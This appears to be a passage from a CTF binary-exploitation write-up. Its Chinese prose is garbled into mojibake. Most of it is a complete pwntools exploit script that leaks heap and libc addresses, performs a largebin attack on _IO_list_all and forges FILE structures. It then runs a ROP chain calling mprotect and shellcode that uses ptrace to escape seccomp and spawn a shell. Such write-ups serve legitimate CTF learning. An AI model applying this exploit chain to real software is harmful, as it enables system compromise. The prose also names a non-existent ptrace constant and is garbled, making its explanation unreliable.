<p>‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÊúâÂäûÊ≥ïÂØπ <code>seccomp</code> ËøõË°åÈÄÉÈÄ∏ÔºåÂÖ∂ÂÖ∑‰ΩìÂÅöÊ≥ï‰∏∫Ôºö‰ΩøÁî® <code>fork</code> ÂºÄ‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÂ≠êËøõÁ®ãÈúÄË¶Å <code>ptrace(PTRACE_TRACEME, 0, 0,0);</code> Êù•ÂÖÅËÆ∏Ëá™Â∑±Ë¢´Áà∂ËøõÁ®ãËøΩË∏™ÔºåÁà∂ËøõÁ®ãÈúÄ‰ΩøÁî® <code>ptrace(PTRACE_ATTACH, pid, 0, 0);</code> Êù•ËøΩË∏™Â≠êËøõÁ®ã„ÄÇÁÑ∂ÂêéÁà∂ËøõÁ®ãÂú® <code>wait()</code> ÈòªÂ°ûÁ≠âÂæÖÂ≠êËøõÁ®ãÂèëËµ∑Á≥ªÁªüË∞ÉÁî®„ÄÇ‰∏ÄÊó¶ÊçïÊçâÂà∞ÔºåÂàôÂ≠êËøõÁ®ãÈòªÂ°ûÔºåÁà∂ËøõÁ®ãÁªßÁª≠ËøêË°åÔºåÊ≠§Êó∂ÈúÄÁî® <code>ptrace(PTRACE_0_SUSPEND_SEECOMP, pid, 0, PTRACE_0_TRACESECCOMP);</code> Â∞ÜË¢´ <code>TRACE</code> Á≥ªÁªüÁöÑË∞ÉÁî®Êîπ‰∏∫ÂÖÅËÆ∏ËøêË°åÔºåÁÑ∂Âêé <code>ptrace(PTRACE_SCONT);</code> Êù•ÊÅ¢Â§çÂ≠êËøõÁ®ãÁöÑÁ≥ªÁªüË∞ÉÁî®ÊâßË°å„ÄÇÁî±‰∫éÊàë‰ª¨‰∏çÁü•ÈÅì <code>flag</code> ÁöÑË∑ØÂæÑÂíåÊñá‰ª∂ÂêçÊòØ‰ªÄ‰πàÔºåÊâÄ‰ª•Áõ¥Êé•‰ΩøÁî® <code>execve</code> Êù•Êãø <code>shell</code>, <code>exp</code> Â¶Ç‰∏ãÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">        env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;49.234.30.109&#x27;,9999)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. Exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,Content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = libc_base + <span class="number">0x1f70f0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="built_in">bin</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">order2 = <span class="string">b&#x27;h\x00&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">order1 = <span class="string">b&#x27;/bin/bas&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 1: fork a new process */</span></span><br><span class="line"><span class="string">    mov rax, 57             /* syscall number for fork (on x86_64) */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke fork() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax           /* check if return value is 0 (child) or positive (parent) */</span></span><br><span class="line"><span class="string">    js _exit                /* if fork failed, exit */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 2: If parent process, attach to child process */</span></span><br><span class="line"><span class="string">    cmp rax, 0              /* are we the child process? */</span></span><br><span class="line"><span class="string">    je child_process        /* if yes, jump to child_process */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    /* Store child PID */</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Attach to child process */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    mov rdi, 0x10           /* PTRACE_ATTACH */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    /* Wait for the child to stop */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string">    mov rsi, rsp            /*  no status*/</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no rusage */</span></span><br><span class="line"><span class="string">    mov rax, 61             /* syscall number for wait4 */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke wait4() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set ptrace options */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Allow the child process to continue */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 0x7            /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Loop to keep monitoring the child */</span></span><br><span class="line"><span class="string">    jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    /* Child process code here */</span></span><br><span class="line"><span class="string">    /* For example, we could execute a shell or perform other actions */</span></span><br><span class="line"><span class="string">    /* To keep it simple, let&#x27;s just execute `/bin/sh` */</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    /* sleep(5) */</span></span><br><span class="line"><span class="string">    /* push 0 */</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    /* push 5 */</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    /* nanosleep(requested_time=&#x27;rsp&#x27;, remaining=0) */</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call nanosleep() */</span></span><br><span class="line"><span class="string">    push SYS_nanosleep /* 0x23 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order2&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order1&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 59             /* syscall number for execve */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_exit:</span></span><br><span class="line"><span class="string">    /* Exit the process */</span></span><br><span class="line"><span class="string">    mov rax, 60             /* syscall number for exit */</span></span><br><span class="line"><span class="string">    xor rdi, rdi            /* status 0 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,shellcode)</span><br><span class="line"></span><br><span class="line">target = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c385</span></span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rax_call_rax = libc_base + <span class="number">0x000000000015f288</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read[<span class="number">0x10</span>:])</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">target = stack - <span class="number">720</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000166262</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x0000000000099a83</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000023a60</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x7b0</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rdi_ret, heap_base,</span><br><span class="line">    pop_rsi_ret, <span class="number">0x2000</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">7</span>,</span><br><span class="line">    mprotect, </span><br><span class="line">    pop_rbp_ret, heap_base + <span class="number">0x3000</span>,</span><br><span class="line">    pop_rax_call_rax, shellcode_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ËøêË°åÂêéÂç≥ÂèØÁ®≥ÂÆöÊãø <code>shell</code>ÔºåÊïàÊûúÂ¶Ç‰∏ãÔºö</p>
